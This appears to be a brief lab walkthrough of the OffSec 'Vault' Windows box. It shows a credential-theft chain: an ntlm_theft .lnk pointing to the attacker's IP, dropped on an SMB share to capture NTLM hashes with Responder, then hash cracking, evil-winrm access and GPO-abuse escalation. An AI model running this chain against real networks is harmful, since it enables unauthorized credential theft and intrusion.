###### tags: `Offsec` `PG Practice` `Hard` `Windows` # Vault
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Use `enum4linux-ng` to find the user `ntbtduzy`; try CrackMapExec (CME) (guest may work)
```
...
``` Try `NTLM Theft`: first download [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) and create a `lnk` file
```
┌──(kali㉿kali)-[~/pgplay/ntlm_theft]
└─$ python3 ntlm_theft.py -g lnk -s 192.168.45.189 -f test                                                                   
Created: test/test.lnk (BROWSE TO FOLDER)
Generation Complete.
``` Start responder, then use smbclient to login to `DocumentsShare` and upload the `test.lnk`
```
┌──(kali㉿kali)-[~/pgplay]
...
smb: \> put test.lnk
``` After a short while you can capture the NTLM hash
```
...
``` Then use `john` to crack the NTLM hash, obtaining user `anirudh` and password `SecureHM`
```
┌──(kali㉿kali)-[~/pgplay]
...
SecureHM         (anirudh)
``` Log in with `evil-winrm`; on `C:\Users\anirudh\Desktop` get local.txt
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Check `whoami /priv` — it shows `SeRestorePrivilege`. Use `net user` for account details
```
...
``` Then use `BloodHound`
See [SharpGPOAbuse - Abuse GPO](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#sharpgpoabuse-abuse-gpo)
```
...
``` Log in with `evil-winrm`; on `C:\Users\Administrator\Desktop` get proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
